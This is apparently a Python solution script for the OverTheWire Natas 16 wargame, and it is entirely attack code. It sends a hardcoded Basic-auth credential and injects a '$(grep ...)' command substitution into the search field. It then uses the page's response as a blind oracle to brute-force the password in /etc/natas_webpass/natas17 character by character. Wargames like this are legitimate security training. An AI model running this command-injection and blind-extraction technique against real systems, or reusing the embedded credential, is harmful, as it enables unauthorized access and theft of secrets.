import requests, string

res = ""
url = "http://natas16.natas.labs.overthewire.org/index.php"

def search(query):
    payload = {"needle": query, "submit": "Search"}
    headers = {"Authorization": "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw=="}
    r = requests.post(url, data=payload, headers=headers)
    return r.text

prev = ''
options = string.ascii_letters + string.digits
for cur in range(1,33):
    for char in options:
            query = f"$(grep ^{prev}{char} /etc/natas_webpass/natas17)"
            if "Africans" not in search(query):
                res += str(char)
                print(res)
                break
    prev += '.'
print(res)
